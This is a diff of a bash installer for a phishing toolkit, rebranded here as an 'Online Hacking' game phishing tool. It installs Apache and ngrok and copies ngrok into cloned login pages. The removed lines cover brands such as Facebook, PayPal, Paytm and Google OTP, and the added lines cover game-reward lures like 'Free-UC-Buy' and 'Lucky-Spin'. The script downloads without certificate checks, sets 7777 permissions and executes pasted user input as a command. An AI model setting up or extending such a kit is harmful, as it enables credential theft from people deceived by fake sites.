@@ -2,15 +2,17 @@
 echo ""
 clear
 echo ""
-echo ""
 echo -e $'\e[1;91m[\e[0m\e[1;77m+\e[0m\e[1;91m]\e[0m\e[1;96m!!! DUDE PLEASE ENTER NGROK !!! \e[0m'
 sleep 2
 clear
 echo ""
+echo -e "\e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m Installing The Game Phishing Tool Please Wait....  \e[0m"
 echo ""
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------  \e[1;91m\e[0m'
 echo -e $'\e[1;96m\e[0m\e[1;77m\e[0m\e[1;96m\e[0m\e[1;91m  !!         DOWNLOAD REQUIREMENTS         !!\e[0m'
 echo -e $'\e[1;91m\e[0m\e[1;91m\e[0m\e[1;96m\e[0m\e[1;91m   ----------------------------------------- \e[1;91m\e[0m'
+echo ""
+echo -e "\e[1;33m[\e[0m\e[1;77m~\e[0m\e[1;33m]\e[0m\e[1;32m \e[95m Onine Hacking \e[0m"
 echo ""
 echo ""
 sudo apt-get install apache2 -y
@@ -26,45 +28,20 @@ apt install gnome-terminal -y
 clear
 wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip --no-check-certificate
 unzip ngrok-stable-linux-amd64.zip
-cp -R ngrok secnhack sites/github/
-cp -R ngrok secnhack sites/Hotstar-otp-bypass/
-cp -R ngrok secnhack sites/instagram/
-cp -R ngrok secnhack sites/Linkedin/
-cp -R ngrok secnhack sites/Netflix/
-cp -R ngrok secnhack sites/Paytm-Phishing/paytm/
-cp -R ngrok secnhack sites/Paytm-Phishing/signup/
-cp -R ngrok secnhack sites/spotify/
-cp -R ngrok secnhack sites/whatsapp-phishing/
-cp -R ngrok secnhack sites/facebook/
-cp -R ngrok secnhack sites/google-otp/
-cp -R ngrok secnhack sites/instafollow/
-cp -R ngrok secnhack sites/ipfinder/
-cp -R ngrok secnhack sites/ola-otpbypass/
-cp -R ngrok secnhack sites/UberEats-Phishing/
-cp -R ngrok secnhack sites/Zomato-Phishing/
-cp -R ngrok secnhack sites/amazonsign/
-cp -R ngrok secnhack sites/tiktok/
-cp -R ngrok secnhack sites/phonepay/
-cp -R ngrok secnhack sites/paypal/
-cp -R ngrok secnhack sites/telegram/
-cp -R ngrok secnhack sites/twitter/
-cp -R ngrok secnhack sites/flipcart/
-cp -R ngrok secnhack sites/wordpress/
-cp -R ngrok secnhack sites/snapchat/
-cp -R ngrok secnhack sites/protonmail/
-cp -R ngrok secnhack sites/stackoverflow/
-cp -R ngrok secnhack sites/ebay/
-cp -R ngrok secnhack sites/twitch/
-cp -R ngrok secnhack sites/ajio/
-cp -R ngrok secnhack sites/cryptocurrency/
-cp -R ngrok secnhack sites/mobikwik/
-cp -R ngrok secnhack sites/pinterest/
-chmod 7777 AdvPhishing.sh
+cp -R ngrok OnlineHacking/secnhack phs/BonusChallenge-Free-Gift-OH/
+cp -R ngrok OnlineHacking/secnhack phs/Free-UC-Buy-OH/
+cp -R ngrok OnlineHacking/secnhack phs/Lucky-Spin-OH/
+chmod 7777 OnlineHacking-Phishing.sh
 clear
 echo ""
-echo -e $'\e[1;91m[\e[0m\e[1;33m *** \e[0m\e[1;96m]\e[0m\e[1;91m KEEP IN MIND YOU HAVE TO ENTER  \e[1;33m[ *** ]\e[0m'
 echo ""
-read -p $'\e[1;91m[\e[0m\e[1;77m+\e[0m\e[1;91m]\e[0m\e[1;96m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
+echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit \e[32mngrok.com \e[m "
+echo " "
+echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & get ngrok authtoken \e[m "
+echo ""
+echo -e $'\e[1;91m[\e[0m\e[1;33m *** \e[0m\e[1;96m]\e[0m\e[1;91m \e[1;33m[ *** ]\e[0m'
+echo ""
+read -p $'\e[1;91m[\e[0m\e[1;77m+\e[0m\e[1;91m]\e[0m\e[1;96m Paste Your Ngrok Token [\e[31mEx \e[32m./ngrok authtoken\e[0m ] : \e[0m' token
 $token
 sleep2
 clear
